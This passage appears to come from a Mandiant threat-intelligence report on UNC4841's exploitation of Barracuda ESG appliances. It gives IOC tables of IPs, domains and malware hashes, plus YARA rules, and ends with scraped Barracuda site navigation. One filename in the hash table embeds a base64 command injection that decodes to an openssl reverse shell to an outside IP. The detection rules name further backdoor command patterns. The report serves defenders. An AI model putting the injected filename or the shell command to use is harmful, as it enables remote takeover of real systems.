| 137.175.51.147 | 54600 | Peg Tech | US |
| 137.175.53.17 | 54600 | Peg Tech | US |
| 137.175.53.170 | 54600 | Peg Tech | US |
| 137.175.53.218 | 54600 | Peg Tech | US |
| 137.175.60.252 | 54600 | Peg Tech | US |
| 137.175.60.253 | 54600 | Peg Tech | US |
| 137.175.78.66 | 54600 | Peg Tech | US |
| 139.84.227.9 | 20473 | Choopa, LLC | ZA |
| 155.94.160.72 | 8100 | CloudVPS | US |
| 155.94.160.95 | 8100 | ASN-QUADRANET-GLOBAL | US |
| 182.239.114.135 | 9231 | China Mobile Hong Kong | HK |
| 182.239.114.254 | 9231 | China Mobile Hong Kong | HK |
| 185.243.41.209 | 61414 | Edgenap Ltd | JP |
| 192.74.226.142 | 54600 | Peg Tech | CN |
| 192.74.254.229 | 54600 | Peg Tech | US |
| 195.234.82.132 | 202422 | G-Core Labs S.A. | US |
| 198.2.254.219 | 54600 | Peg Tech | US |
| 198.2.254.220 | 54600 | Peg Tech | US |
| 198.2.254.221 | 54600 | Peg Tech | US |
| 198.2.254.222 | 54600 | Peg Tech | US |
| 198.2.254.223 | 54600 | Peg Tech | US |
| 199.247.23.80 | 20473 | Choopa, LLC | DE |
| 213.156.153.34 | 202422 | G-Core Labs S.A. | US |
| 216.238.112.82 | 20473 | Choopa, LLC | BR |
| 23.224.42.5 | 40065 | Choopa, LLC | US |
| 23.224.42.29 | 40065 | Cnservers LLC | US |
| 23.224.78.130 | 40065 | Cnservers LLC | US |
| 23.224.78.131 | 40065 | Cnservers LLC | US |
| 23.224.78.132 | 40065 | Cnservers LLC | US |
| 23.224.78.133 | 40065 | Cnservers LLC | US |
| 23.224.78.134 | 40065 | Cnservers LLC | US |
| 37.9.35.217 | 202422 | G-Core Labs S.A. | US |
| 38.54.1.82 | 138915 | Kaopu Cloud HK Limited | SG |
| 38.54.113.205 | 138915 | Kaopu Cloud HK Limited | MY |
| 38.60.254.165 | 174 | Cogent Communications | US |
| 45.148.16.42 | 42675 | Obehosting AB | DK |
| 45.148.16.46 | 42675 | Obehosting AB | DK |
| 45.154.253.153 | 41634 | Svea Hosting AB | GB |
| 45.154.253.154 | 41634 | Svea Hosting AB | GB |
| 45.63.76.67 | 20473 | Choopa, LLC | US |
| 51.91.79.17 | 16276 | OVH SAS | FR |
| 52.23.241.105 | 14618 | Amazon.com | US |
| 54.197.109.223 | 14618 | AMAZON-AES | US |
| 64.176.4.234 | 20473 | Choopa, LLC | US |
| 64.176.7.59 | 20473 | Choopa, LLC | US |

### Domains

| bestfindthetruth[.]com |
| --- |
| goldenunder[.]com |
| note.goldenunder[.]com |
| singamofing[.]com |
| singnode[.]com |
| mx01.bestfindthetruth[.]com |
| xxl17z.dnslog[.]cn |

### Host IOCs

| **Hash** | **Filename** | **Type** |
| --- | --- | --- |
| 06528143748b54793b2a7561d96138c5 | abcdefg=qwesdnfkjsdhijklmnopqrstuvwxynanfasdjkfjksajdfkljeklnfisndfnhishdfhnsdanfsdnfhhhfhasdfjkqwe80749.txt | CVE-2023-2868 TAR Exploit |
| 4495cb72708f486b734de6b6c6402aba | abcdefg=a123sdffsdfsdafsadfasdfsadfhijklmnopqrstuvwxyzssdffggsdfasdfafjklsadjfneiunsdfhnsndfn52023.txt | CVE-2023-2868 TAR Exploit |
| 61514ac639721a51e98c47f2ac3afe81 | abcdefg=abcdfwdsaifnihdnfgiyushadhijklmnopqrstuvwxyznfhjhauidsdfasdsdfqwer5we212rsahfeadssbn37412.txt | CVE-2023-2868 TAR Exploit |
| f667939000c941e5b9dc91303c98b7fc | abcdefg=aasadfewsdfsadnhijklmnopqrstuvwxyzxcjvueortyuiqwnem,nxcnngvmdfngkdjfgkjdiogjevdsfvjdfjvkl10978.txt | CVE-2023-2868 TAR Exploit |
| fe1e2d676c91f899b706682b70176983 | abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6NDQzID4vdG1wL3AgMj4vZGV2L251bGw7cm0gL3RtcC9wIg==;ee=ba;G=s;"ech"o $abcdefg|${ee}se64 -d|${G}h;wh66489.txt | CVE-2023-2868 TAR Exploit |
| 0d67f50a0bf7a3a017784146ac41ada0 | snapshot.tar | CVE-2023-2868 TAR Exploit |
| 7a31d314247ac33ae39a9248b770d717 | snapshot.tar | CVE-2023-2868 TAR Exploit |
| 206b05ef55aff6fa453ba8e5f6c55167 | imgfile.jpg | CVE-2023-2868 TAR Exploit |
| 42722b7d04f58dcb8bd80fe41c7ea09e | 11111.tar | CVE-2023-2868 TAR Exploit |
| 5392fb400bd671d4b185fb35a9b23fd3 | snapshot.tar | CVE-2023-2868 TAR Exploit |
| 878cf1de91f3ae543fd290c31adcbda4 | snapshot.tar | CVE-2023-2868 TAR Exploit |
| ac4fb6d0bfc871be6f68bfa647fc0125 | abcdefg=aasadfewsdfsadnhijklmnopqrstuvwxyzxcjvueortyuiqwnem,nxcnngvmdfngkdjfgkjdiogjevdsfvjdfjvkl10978.txt | CVE-2023-2868 TAR Exploit |
| 479315620c9a5a62a745ab586ba7b78c | unknown | X509 Server Certificate |
| 683acdb559bbc7fb64431d1f579a8104 | unknown | X509 Server Certificate |
| ef00c92fa005c2f61ec23d5278a8fa25 | unknown | X509 Server Certificate |
| ff4f425be50bacbb10f16287aaddb7e3 | unknown | X509 Server Certificate |
| 94b6f76da938ef855a91011f16252d59 | core\_check.sh | Shell Script |
| 32ffe48d1a8ced49c53033eb65eff6f3 | BarracudaMailService.1 | SEASPY |
| 8406f74ac2c57807735a9b86f61da9f9 | intent | Unknown (Deleted) |
| d81263e6872cc805e6cf4ca05d86df4e | mod\_content.lua | SKIPJACK |
| da06e7c32f070a9bb96b720ef332b50b | nfsd.ko | Unknown (Potential SANDBAR) |
| c5c93ba36e079892c1123fe9dffd660f | unknown | DEPTHCHARGE Launcher |
| 19e373b13297de1783cecf856dc48eb0 | client\_linux | Tunneler |
| c56d7b86e59c5c737ee7537d7cf13df1 | autoins | SALTWATER Launcher |
| cb0f7f216e8965f40a724bc15db7510b | update\_v35.sh | SALTWATER Installer |
| 881b7846f8384c12c7481b23011d8e45 | update\_v31.sh | SEASIDE Installer |
| f5ab04a920302931a8bd063f27b745cc | intent\_helo | SEASIDE Launcher |
| 0245e7f9105253ecb30de301842e28e4 | unknown | SEASPY Launcher |
| 0c227990210e7e9d704c165abd76ebe2 | unknown | SEASPY Launcher |
| 132a342273cd469a34938044e8f62482 | unknown | SEASPY Launcher |
| 1bc5212a856f028747c062b66c3a722a | unknown | SEASPY Launcher |
| 2d841cb153bebcfdee5c54472b017af2 | rc | SEASPY Launcher |
| 2e30520f8536a27dd59eabbcb8e3532a | unknown | SEASPY Launcher |
| 349ca242bc6d2652d84146f5f91c3dbb | intentbas | SEASPY Launcher |
| 3e3f72f99062255d6320d5e686f0e212 | unknown | SEASPY Launcher |
| 4c1c2db989e0e881232c7748593d291e | unknown | SEASPY Launcher |
| 7d7fd05b262342a9e8237ce14ec41c3b | unknown | SEASPY Launcher |
| 8fc03800c1179a18fbd58d746596fa7d | update\_version | SEASPY Launcher |
| a45ca19435c2976a29300128dc410fd4 | unknown | SEASPY Launcher |
| ba7af4f98d85e5847c08cf6cefdf35dc | rc | SEASPY Launcher |
| c528b6398c86f8bdcfa3f9de7837ebfe | update\_v2.sh | SEASPY Launcher |
| c7a89a215e74104682880def469d4758 | unknown | SEASPY Launcher |
| c979e8651c1f40d685be2f66e8c2c610 | rc | SEASPY Launcher |
| d1392095086c07bd8d2ef174cb5f6ca8 | intent\_bas | SEASPY Installer |
| ad1dc51a66201689d442499f70b78dea | unknown | SKIPJACK Launcher |
| dde2d3347b76070fff14f6c0412f95ba | run.sh | DEPTHCHARGE Archive |
| 858174c8f4a45e9564382d4480831c6b | unknown | SALTWATER |
| 2ccb9759800154de817bf779a52d48f8 | update\_v31.sh | SEASIDE Archive |
| 177add288b289d43236d2dba33e65956 | pd | WHIRLPOOL |
| e52871d82de01b7e7f134c776703f696 | rverify | WHIRLPOOL |
| 336c12441b7a678280562729c974a840 | unknown | SEASPY Archive |
| 5fdee67c82f5480edfa54afc5a9dc834 | install\_bvp74\_auth.tar | SEASPY Archive |
| 407738e565b4e9dafb07b782ebcf46b0 | unknown | Shell Script |
| 67a4556b021578e0a421fdc251f07e04 | install\_bvp74\_auth.tar | SEASPY Archive |
| 694cdb49879f1321abb4605adf634935 | install\_bvp74\_auth.tar | SEASPY Archive |
| 6f79ef58b354fd33824c96625590c244 | intent\_reuse | SALTWATER Launcher |
| 7ebd5f3e800dcd0510cfcbe2351d3838 | unknown | SEASPRAY Archive |
| d098fe9674b6b4cb540699c5eb452cb5 | test.sh | Shell Script |
| 03e07c538a5e0e7906af803a83c97a1e | r | DEPTHCHARGE Archive |
| 0dd78b785e7657999d05d52a64b4c4cf | unknown | DEPTHCHARGE Launcher |
| 35a432e40da597c7ab63ff16b09d19d8 | unknown | DEPTHCHARGE Launcher |
| 806250c466824a027e3e85461dc672db | hw-set | DEPTHCHARGE Launcher |
| 830fca78440780aef448c862eee2a8ac | hw-set | DEPTHCHARGE Launcher |
| b354111afc9c6c26c1475e761d347144 | hw-set | DEPTHCHARGE Launcher |
| b745626b36b841ed03eddfb08e6bb061 | libutil.so | DEPTHCHARGE |
| b860198feca7398bc79a8ec69afc65ed | hw-set | DEPTHCHARGE Launcher |
| c2e577c71d591999ad5c581e49343093 | run.sh | DEPTHCHARGE Installer |
| e68cd991777118d76e7bce163d8a2bc1 | hw-set | DEPTHCHARGE Launcher |
| ed648c366b6e564fc636c072bbcac907 | reprod\_run.sh | DEPTHCHARGE Installer |
| ff005f1ff98ec1cd678785baa0386bd1 | hw-set | DEPTHCHARGE Launcher |
| a28de396aa91b7faca35e861b634c502 | foxdoor\_shell | FOXTROT |
| 1b1830abaf95bd5a44aa3873df901f28 | unknown | SALTWATER |
| 1fea55b7c9d13d822a64b2370d015da7 | mod\_udp.so | SALTWATER |
| 3b93b524db66f8bb3df8279a141734bb | mod\_rtf.so.so | SALTWATER |
| 4cd0f3219e98ac2e9021b06af70ed643 | mod\_udp.so | SALTWATER |
| 4ec4ceda84c580054f191caa09916c68 | mod\_rft.so | SALTWATER |
| 64c690f175a2d2fe38d3d7c0d0ddbb6e | mod\_udp.so | SALTWATER |
| 827d507aa3bde0ef903ca5dec60cdec8 | mod\_udp.so | SALTWATER |
| 831d41ba2a0036540536c2f884d089f9 | sendscd | SALTWATER |
| 8fdf3b7dc6d88594b8b5173c1aa2bc82 | mod\_rft.so | SALTWATER |
| 9bc6d6af590e7d94869dee1d33cc1cae | unknown | SALTWATER |
| b601fce4181b275954e3f35b18996c92 | install\_reuse | SALTWATER Archive |
| 9033dc5bac76542b9b752064a56c6ee4 | nfsd\_stub.ko | SANDBAR |
| cd2813f0260d63ad5adf0446253c2172 | require\_helo.lua | SEASIDE |
| cd2813f0260d63ad5adf0446253c2576 | unknown | SEASIDE |
| 666da297066a2596cacb13b3da9572bf | mod\_sender.lua | SEASIDE Launcher |
| 35cf6faf442d325961935f660e2ab5a0 | mod\_attachment.lua | SEASPRAY Launcher |
| ce67bb99bc1e26f6cb1f968bc1b1ec21 | unknown | SEASPRAY Archive |
| 025046adfa7b2cf50f86f5e0c6bb2ab7 | unknown | SEASPY |
| 0805b523120cc2da3f71e5606255d29c | resize\_reisertab | SEASPY |
| 17696a438387248a12cc911fbae8620e | resize\_reisertab | SEASPY |
| 19ebfe05040a8508467f9415c8378f32 | BarracudaMailService | SEASPY |
| 1b92e5455de794af560f10a907d931cc | resize2fstab | SEASPY |
| 1bbb32610599d70397adfdaf56109ff3 | BarracudaMailService | SEASPY |
| 23f4f604f1a05c4abf2ac02f976b746b | unknown | SEASPY |
| 3c20617f089fe5cc9ba12c43c6c072f5 | unknown | SEASPY |
| 45b79949276c9cb9cf5dc72597dc1006 | resize\_reisertab | SEASPY |
| 4b511567cfa8dbaa32e11baf3268f074 | BarracudaMailService | SEASPY |
| 4ca4f582418b2cc0626700511a6315c0 | BarracudaMailService | SEASPY |
| 5d6cba7909980a7b424b133fbac634ac | BarracudaMailService | SEASPY |
| 69ef9a9e8d0506d957248e983d22b0d5 | resize2fstab | SEASPY |
| 724079649f690ca1ee80b8b3125b58b9 | unknown | SEASPY |
| 76811232ede58de2faf6aca8395f8427 | resize2fstab | SEASPY |
| 82eaf69de710abdc5dea7cd5cb56cf04 | BarracudaMailService | SEASPY |
| 8f1c40bd3ab33d517839ca17591d8666 | resize2fstab | SEASPY |
| a08a99e5224e1baf569fda816c991045 | BarracudaMailService | SEASPY |
| bef722484288e24258dd33922b1a7148 | resize2fstab | SEASPY |
| d8e748b1b609d376f57343b2bde94b29 | unknown | SEASPY |
| db4c48921537d67635bb210a9cb5bb52 | BarracudaMailService | SEASPY |
| e80a85250263d58cc1a1dc39d6cf3942 | BarracudaMailService | SEASPY |
| f6857841a255b3b4e4eded7a66438696 | unknown | SEASPY |
| fe031a93c84aa3d01e2223a6bb988fa0 | unknown | SEASPY |
| 3273a29d15334efddd8276af53c317fb | mknod | SKIPJACK Installer |
| 446f3d71591afa37bbd604e2e400ae8b | mknod | SKIPJACK Installer |
| 87847445f9524671022d70f2a812728f | mod\_content.lua | SKIPJACK |
| 9aa90d767ba0a3f057653aadcb75e579 | unknown | SKIPJACK |
| e4e86c273a2b67a605f5d4686783e0cc | mknod | SKIPJACK Installer |
| ec0d46b2aa7adfdff10a671a77aeb2ae | unknown | SKIPJACK Installer |
| 436587bad5e061a7e594f9971d89c468 | saslautchd | WHIRLPOOL |
| 85c5b6c408e4bdb87da6764a75008adf | rverify | WHIRLPOOL |
| f013a111044f3228b978f49e1ee374fe | mod\_attachment.lua | SEASPRAY Launcher |
| 90a75b588f63c6a0294a48e93628aec9 | nfsd\_stub.ko | SANDBAR |

## Detection Rules

### YARA Rules

```
rule M_APT_Installer_SKIPJACK_1 {
meta:
  author = "Mandiant"
  md5 = "e4e86c273a2b67a605f5d4686783e0cc"

strings:
  $str1 = "hdr:name() == 'Content-ID'" base64
  $str2 = "hdr:body() ~= nil" base64
  $str3 = "string.match(hdr:body(),\"^[%w%+/=\\r\\n]+$\")" base64
  $str4 = "openssl aes-256-cbc" base64
  $str5 = "mod_content.lua"
  $str6 = "#!/bin/sh"

condition:
  all of them
}
```
SKIPJACK Installer

```
rule M_APT_Backdoor_SKIPJACK_1 {

meta:
  author = "Mandiant"
  md5 = "87847445f9524671022d70f2a812728f"

strings:
  $str1 = "hdr:name() == 'Content-ID'"
  $str2 = "hdr:body() ~= nil"
  $str3 = "string.match(hdr:body(),\"^[%w%+/=\\r\\n]+$\")"
  $str4 = "openssl aes-256-cbc"
  $str5 = "| base64 -d| sh 2>"

condition:
  all of them
}
```
TSKIPJACK Backdoor

```
rule M_APT_Backdoor_DEPTHCHARGE_1 {

meta:
  author = "Mandiant"
  md5 = "b745626b36b841ed03eddfb08e6bb061"

strings:
  $backdoor_command_main = { 65 63 68 6F 20 2D 6E 20 27 25 73 27 20 7C (20 62 61 73 65 36 34 20 2D 64 20 7C 20 | 20 ) 6F 70 65 6E 73 73 6C 20 61 65 73 2D 32 35 36 2D 63 62 63 20 2D 64 20 2D 4B 20 [24-124] 20 32 3e 2f 64 65 76 2f 6e 75 6c 6c 20 7c 20 73 68 }
  $e1 = "welcomeflag" fullword
  $e2 = "welcomebuffer" fullword
  $e3 = "launch_backdoor" fullword
  $e4 = "backdoor_initalize" fullword
  $s1 = "BSMTP_ID" fullword
  $s2 = "result %d" fullword
  $s3 = "ehlo" fullword

condition:
  uint32(0)==0x464c457f and $backdoor_command_main and 4 of them
}
```
DEPTHCHARGE

```
rule M_APT_Launcher_FOXGLOVE_1 {

meta:
  author = "Mandiant"
  md5 = "c9ae8bfd08f57d955465f23a5f1c09a4"

strings:
  $str1 = { 48 ?? 66 6F 78 64 6F 6F 72 5F 48 89 ?? C7 ?? ?? 73 68 65 6C 66 C7 ?? ?? 6C 00 }
  $str2 = { 48 ?? 2F 75 73 72 2F 73 68 61 48 ?? 72 65 2F 66 6F 78 64 6F 48 89 ?? 48 89 ?? ?? 48 ?? 6F 72 2F 66 6F 78 64 6F 48 ?? 6F 72 5F 73 68 65 6C 6C }
  $str3 = "shell"
  $str4 = "start.c"
  $str5 = "base64en"
  $str6 = "base64de"
  $str7 = "-r"
  $str8 = "-s"
  $str9 = "-p"
  $str10 = "-t"

condition:
  uint32(0) == 0x464c457f and all of them
}
```
FOXGLOVE

```
rule M_APT_Backdoor_FOXTROT_1 {

meta:
  author = "Mandiant"
  md5 = "a28de396aa91b7faca35e861b634c502"

strings:
  $str1 = "/usr/share/foxdoor/uuid"
  $str2 = "/.mozilla/firefox/"
  $str3 = "hide_foxdoor_mod"
  $str4 = "POST /api/index.cgi"
  $str5 = "7(Zu9YTsA7qQ#vw"
  $str6 = "CONNECT %s:%d HTTP/1.1"
  $str7 = "network.proxy.http_port"
  $str8 = "exec bash --rcfile"

condition:
  uint32(0) == 0x464c457f and all of them
}
```
FOXTROT

Mandiant Security Validation Actions

Organizations can validate their security controls using the following actions with [Mandiant Security Validation](https://cloud.google.com/security/products/mandiant-security-validation).

| **VID** | **Name** |
| --- | --- |
| A106-709  Command and Control | UNC4841, DNS Query, Variant #10  A106-710 |
| A106-710  Command and Control | UNC4841, DNS Query, Variant #2 |
| A106-711  Command and Control | UNC4841, DNS Query, Variant #3 |
| A106-712  Command and Control | UNC4841, DNS Query, Variant #11 |
| A106-713  Command and Control | UNC4841, DNS Query, Variant #4 |
| A106-714  Command and Control | UNC4841, DNS Query, Variant #5 |
| A106-715  Command and Control | UNC4841, DNS Query, Variant #8 |
| A106-716  Command and Control | UNC4841, DNS Query, Variant #7 |
| A106-717  Command and Control | UNC4841, DNS Query, Variant #6 |
| A106-718  Command and Control | UNC4841, DNS Query, Variant #9 |
| A106-719  Malicious File Transfer | UNC4841, DEPTHCHARGE, Download, Variant #1 |
| A106-720  Malicious File Transfer | UNC4841, SALTWATER, Download, Variant #2 |
| A106-721  Malicious File Transfer | UNC4841, FOXTROT, Download, Variant #1 |
| A106-722  Malicious File Transfer | UNC4841, SKIPJACK, Download, Variant #2 |

Posted in

* [Threat Intelligence](https://cloud.google.com/blog/topics/threat-intelligence)
##### Related articles

[![https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png)Threat Intelligence
### Your Single-Page Applications Are Vulnerable: Here's How to Fix Them

By Mandiant • 9-minute read](https://cloud.google.com/blog/topics/threat-intelligence/single-page-applications-vulnerable)[![https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png)Threat Intelligence
### Backscatter: Automated Configuration Extraction

By Mandiant • 4-minute read](https://cloud.google.com/blog/topics/threat-intelligence/backscatter-automated-configuration-extraction)[![https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png)Threat Intelligence
### Ivanti Connect Secure VPN Targeted in New Zero-Day Exploitation

By Mandiant • 28-minute read](https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day)[![https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png)Threat Intelligence
### XRefer: The Gemini-Assisted Binary Navigator

By Mandiant • 26-minute read](https://cloud.google.com/blog/topics/threat-intelligence/xrefer-gemini-assisted-binary-navigator)

=== Content from www.barracuda.com_7290ddb1_20250115_091034.html ===


[Introducing Managed XDR: Stay ahead of attackers with 24/7 managed security](https://www.barracuda.com/products/managed-xdr)

MENU

[![Barracuda logo]()](https://www.barracuda.com)

* [Free Trial](https://www.barracuda.com/support/free-trials)
* ![Search](/etc.clientlibs/barracuda-corp/clientlibs/clientlib-site/resources/images/icon_search_v2.svg)
* ![Portal Login](/etc.clientlibs/barracuda-corp/clientlibs/clientlib-site/resources/images/icon_partner-login.svg)
  [Partner Portal Login](https://partners.barracuda.com/login/)
  [Product Login](https://login.barracudanetworks.com/auth/login/)

  ---

  [Customer Support Community](https://barracudanetworks.force.com/customers/s)
  [Partner Support Community](https://barracudanetworks.force.com/partners2)
* ![Contact](/etc.clientlibs/barracuda-corp/clientlibs/clientlib-site/resources/images/icon_contact.svg)
* ![Contact](/etc.clientlibs/barracuda-corp/clientlibs/clientlib-site/resources/images/icon_contact.svg)
  +1 888 268 4772
  Live Chat
* English
  [Deutsch](https://de.barracuda.com/company/legal/esg-vulnerability?switch_lang_code=de)
  [Français](https://fr.barracuda.com/company/legal/esg-vulnerability?switch_lang_code=fr)
  [日本語](https://www.barracuda.co.jp/?switch_lang_code=jp?switch_lang_code=jp)

[![Barracuda logo](/content/dam/barracuda-corp/images/site/logo_barracuda_primary_strapline_fins_only.svg)
![Barracuda logo](/content/dam/barracuda-corp/images/site/logo_barracuda_primary_strapline_fins_only.svg)](https://www.barracuda.com)

* Products
* Solutions
* Resources
* Support
* Partners
* Company

* [Free Trial](https://www.barracuda.com/support/free-trials)
* [Contact Us](https://www.barracuda.com/company/contact)
* English
  [Deutsch](https://de.barracuda.com/company/legal/esg-vulnerability?switch_lang_code=de)
  [Français](https://fr.barracuda.com/company/legal/esg-vulnerability?switch_lang_code=fr)
  [日本語](https://www.barracuda.co.jp/?switch_lang_code=jp?switch_lang_code=jp)

HOME
×

HOME / Products
×

Barracuda Cybersecurity Platform

Cyberattacks can come from anywhere. Barracuda protects you everywhere.

[Explore the Platform
![]()](https://www.barracuda.com/products)

* Email Protection
* Data Protection
* Managed XDR
* Network Protection
* Application Protection

[All Products
![]()](https://www.barracuda.com/products/explore-our-products#tabNav)

Email Protection
×

[**Barracuda Email Protection**](https://www.barracuda.com/products/email-protection)

Effortless defense against complex threats with AI-powered email security.

[See Plans
![]()](https://www.barracuda.com/products/email-protection/plans)

**Use Cases**

* [Phishing and Impersonation Protection](https://www.barracuda.com/products/email-protection/phishing-protection)
* [Incident Response](https://www.barracuda.com/products/email-protection/incident-response)
* [Account Takeover Protection](https://www.barracuda.com/products/email-protection/account-takeover-protection)
* [Domain Fraud Protection (DMARC)](https://www.barracuda.com/products/email-protection/domain-fraud-protection)
* [Spam, Malware, and Advanced Threat Protection](https://www.barracuda.com/products/email-protection/spam-malware)

* [Security Awareness Training](https://www.barracuda.com/products/email-protection/security-awareness-training)
* [Email Encryption](https://www.barracuda.com/products/email-protection/email-encryption)
* [Microsoft 365 Backup](https://www.barracuda.com/products/email-protection/cloud-to-cloud-backup)
* [Cloud Archiving](https://www.barracuda.com/products/email-protection/cloud-archiving)
* [Data Inspector](https://www.barracuda.com/products/data-protection/data-inspector)™

---

**Free Tools**

* [Free Email Threat Scan](https://www.barracuda.com/products/email-scan)
* [Build and Price](https://www.barracuda.com/products/email-protection/configurator)

Data Protection
×

**Barracuda Data Protection**

Protect data on-site and in the cloud from threats like ransomware, exfiltration, and accidental loss.

**Products**

* [Backup](https://www.barracuda.com/products/data-protection/backup)

  Protect data to minimize downtime and prevent data loss.
* [Cloud-to-Cloud Backup](https://www.barracuda.com/products/data-protection/cloud-to-cloud-backup)

  Get SaaS backup for Microsoft 365 and Entra ID with unlimited storage.

* [Entra ID Backup](https://www.barracuda.com/products/data-protection/entra-id) New

  Protect your Entra ID data and recover from malicious attack and errors.
* [Data Inspector](https://www.barracuda.com/products/data-protection/data-inspector)™

  Scan your Microsoft 365 for sensitive data and malware.

---

**Free Tools**

* [Free Data Scan](https://www.barracuda.com/products/data-protection/data-inspector/free-scan)
* [Build and Price](https://www.barracuda.com/products/data-protection/backup/configurator)

Managed XDR
×

[**Barracuda Managed XDR**](https://www.barracuda.com/products/managed-xdr) New

Rapidly mature your cybersecurity posture with comprehensive cybersecurity-as-a-service.

* [Get a Consultation](https://www.barracuda.com/products/managed-xdr/consultation)
* [Build and Price](https://www.barracuda.com/products/managed-xdr/build-and-price)

Network Protection
×

[**Barracuda Network Protection**](https://www.barracuda.com/products/network-protection)

Protect and optimize your network.

**I'm interested in**

* [Secure Access Service Edge (SASE)](https://www.barracuda.com/products/network-protection/secureedge)
* [Next-Generation Security](https://www.barracuda.com/products/network-protection/secureedge/next-generation-security)
* [Secure SD-WAN](https://www.barracuda.com/products/network-protection/secureedge/secure-sd-wan)
* [Zero Trust Access](https://www.barracuda.com/products/network-protection/secureedge/zero-trust-access)
* [Web Security](https://www.barracuda.com/products/network-protection/secureedge/web-security)
* [Industrial Security](https://www.barracuda.com/products/network-protection/industrial-security)
* [VPN Replacement](https://www.barracuda.com/products/network-protection/vpn-replacement)

**Products**

* [SecureEdge](https://www.barracuda.com/products/network-protection/secureedge)
* [CloudGen Firewall](https://www.barracuda.com/products/network-protection/cloudgen-firewall)
* [Web Security Gateway](https://www.barracuda.com/products/network-protection/web-security-gateway)

---

**Free Tools**

* [Build and Price](https://www.barracuda.com/products/network-protection/cloudgen-firewall/configurator)

Application Protection
×

[**Barracuda Application Protection**](https://www.barracuda.com/products/application-protection)

Protect all your web applications and APIs with one comprehensive solution.

[See Plans
![]()](https://www.barracuda.com/products/application-protection/plans)

**Use Cases**

* [Web Application Protection](https://www.barracuda.com/products/application-protection/web-application-protection)
* [API Protection](https://www.barracuda.com/products/application-protection/api-protection)
* [Full Spectrum DDoS Protection](https://www.barracuda.com/products/application-protection/full-spectrum-ddos-protection)
* [Advanced Bot Protection](https://www.barracuda.com/products/application-protection/advanced-bot-protection)
* [Secure App Delivery](https://www.barracuda.com/products/application-protection/secure-app-delivery)
* [Reporting & Analytics](https://www.barracuda.com/products/application-protection/reporting-and-analytics)

**Deployment Options**

* [Web Application Firewall](https://www.barracuda.com/products/application-protection/web-application-firewall)
* [WAF-as-a-Service](https://www.barracuda.com/products/application-protection/waf-as-a-service)

---

**Free Tools**

* [Free Website Vulnerability Scan](https://bvm.barracudanetworks.com/appscan_signup?barracuda_web_visitor_id=51703651&session_id=1d4f26cc77464a90368749630261edda)
* [Build and Price](https://www.barracuda.com/products/application-protection/build-and-price)

HOME / Solutions
×

* Featured Solutions
* Cyberthreat Protection
* Industries
* Deployments

[All Solutions
![]()](https://www.barracuda.com/solutions)

Featured Solutions
×

[![Ransomware Protection](/adobe/dynamicmedia/deliver/dm-aid--02caa0fa-b2db-47e0-b0cc-5e0d144ca12c/solutions-ransomware-protection.jpg?preferwebp=true&quality=95)](https://www.barracuda.com/solutions/ransomware)

[**Ransomware Protection**](https://www.barracuda.com/solutions/ransomware)

Protect your business and users from ransomware attacks in three easy steps.

[![AI in Cybersecurity](/adobe/dynamicmedia/deliver/dm-aid--e14a8b44-bfd1-44c3-9717-1c62e7ab30fd/technology-ai-cybersecurity.jpg?preferwebp=true&quality=95)](https://www.barracuda.com/solutions/ai-in-cybersecurity)

[**AI in Cybersecurity**](https://www.barracuda.com/solutions/ai-in-cybersecurity)

While AI is accelerating cybersecurity risks, find out how you can harness its power to stay ahead.

[![Zero Trust Access](/adobe/dynamicmedia/deliver/dm-aid--09c85f36-d6bf-47e8-9c6e-015672fd48e7/featured-zero-trust-access.png?preferwebp=true&quality=95)](https://www.barracuda.com/products/network-protection/secureedge/zero-trust-access)

[**Zero Trust Access**](https://www.barracuda.com/products/network-protection/secureedge/zero-trust-access)

Secure access to your applications and data from any device – safer than VPN!

Cyberthreat Protection
×

* [AI in Cybersecurity](https://www.barracuda.com/solutions/ai-in-cybersecurity)

  While AI is accelerating cybersecurity risks, find out how you can harness its power to stay ahead.
* [Barracuda Security Insights](https://www.barracuda.com/solutions/cyber-security-insights)

  Check out our real-time view of global cyber threats, collected from millions of data points.
* [Top 13 Email Threat Types](https://www.barracuda.com/solutions/13-email-threat-types)

  Learn how to protect your organization from all 13 types of email attacks.

* [Advanced Threat Protection](https://www.barracuda.com/solutions/advanced-threat-protection)

  Stop zero-hour and advanced attacks that evade traditional detection techniques.
* [Cyber Liability Insurance](https://www.barracuda.com/solutions/cyber-liability-insurance)

  Protect your business and support your cyber insurance policy.

Industries
×

* [Manufacturing](https://www.barracuda.com/solutions/manufacturing)

  Secure industrial assets and IT control systems from ransomware and advanced cyberthreats.
* [Retail](https://www.barracuda.com/solutions/retail)

  Protect your customers and brand from advanced cyberthreats.
* [Education](https://www.barracuda.com/solutions/education)

  Protect students and faculty from ransomware and other cyber attacks. Ensure compliance with safe learning regulations.

* [Healthcare](https://www.barracuda.com/solutions/healthcare)

  Protect patient data and avoid disruptions that could affect patient care.
* [Financial Services](https://www.barracuda.com/solutions/financial-services)

  Financial services are a prime target for cyber attacks. Learn how Barracuda can help.
* [State and Local Government](https://www.barracuda.com/solutions/state-city-gov)

  Explore how Barracuda protects state and local government websites and data.

Deployments
×

* [On-Premises Deployment Options](https://www.barracuda.com/solutions/on-premises)

  Protect your physical locations with cloud-connected appliances and software that can be deployed on premises or in the cloud.
* [SaaS Deployments](https://www.barracuda.com/solutions/saas)

  Deploy simple and scalable security with no software or hardware to install.
* [Microsoft 365](https://www.barracuda.com/products/email-protection/protect-microsoft-365)

  Protect all your email, SharePoint, OneDrive, and Teams data with protection that goes far beyond what is built into Microsoft 365.

* [Amazon Web Services (AWS)](https://www.barracuda.com/solutions/aws)

  Browse our security and network solutions designed specifically for AWS.
